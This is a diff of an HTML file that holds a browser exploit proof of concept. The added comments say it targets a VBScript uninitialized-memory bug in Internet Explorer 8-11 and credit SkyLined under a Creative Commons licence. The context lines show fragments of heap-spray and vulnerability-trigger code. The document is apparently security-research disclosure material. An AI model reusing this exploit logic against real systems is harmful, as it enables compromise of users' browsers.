@@ -2,6 +2,9 @@
   <head>
     <meta http-equiv="X-UA-Compatible" content="IE=10">
     <script language="JavaScript">
+      // This PoC attempts to exploit a use-of-uninitialized-memory bug in
+      // VBScript that affects Microsoft Internet Explorer 8-11.
+      // See http://blog.skylined.nl/20161107001.html for details.
       function createRepeatedString(uSize, sString) {
         var sRepeatedString = "";
         var uLeftMostBit = 1 << (Math.ceil(Math.log(uSize+1) / Math.log(2)) - 1);
@@ -80,6 +83,8 @@
         // We'll do this a number of times
         sprayMSVCRTHeapAndTriggerVuln(sPattern, sBuffer);
       }
+      // This work by SkyLined is licensed under a Creative Commons
+      // Attribution-Non-Commercial 4.0 International License. 
     </script>
     <script language="VBScript">
       Set oRegExp = New RegExp
